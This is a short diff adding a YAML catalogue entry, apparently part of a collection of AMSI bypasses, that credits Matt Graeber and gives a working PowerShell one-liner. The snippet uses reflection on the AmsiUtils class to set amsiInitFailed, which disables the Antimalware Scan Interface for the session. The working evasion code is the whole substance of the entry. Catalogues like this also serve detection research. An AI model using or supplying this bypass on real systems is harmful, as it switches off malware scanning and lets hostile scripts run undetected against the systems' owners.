@@ -1,0 +1,15 @@
+name: mattifestation
+authors:
+  - name: Matt Graeber
+    handle: '@mattifestation'
+    link: https://twitter.com/mattifestation
+description: |
+  Reflectively disables AMSI for the current PowerShell session.
+  Note: This does not disable AMSI in the CLR
+comments:
+  - Published via tweet that has since been taken down
+language: powershell
+min_language_version: '3'
+script: |
+  $Ref=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
+  $Ref.GetField('amsiInitFailed','NonPublic,Static').Setvalue($Null,$true);
